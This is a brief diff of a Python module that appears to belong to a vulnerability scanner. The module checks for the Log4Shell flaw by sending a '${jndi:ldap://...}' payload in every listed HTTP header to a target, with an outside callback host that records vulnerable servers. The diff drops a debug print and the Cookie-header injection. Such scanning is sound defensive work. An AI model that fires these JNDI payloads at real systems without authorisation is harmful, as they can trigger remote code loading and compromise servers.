@@ -101,12 +101,10 @@ class Module:
         vuln_id = VulnCallback.new_vulnerability_check(vuln_info)
 
         payload = "${jndi:ldap://%s/vuln/%s}" % (args['args'][0], vuln_id)
-        print(payload)
 
         query_headers = {}
         for h in headers:
             query_headers[h] = payload
-        query_headers['Cookie'] = "SessCookie=%s" % payload
 
         http.get(target['path'], headers=query_headers)
 
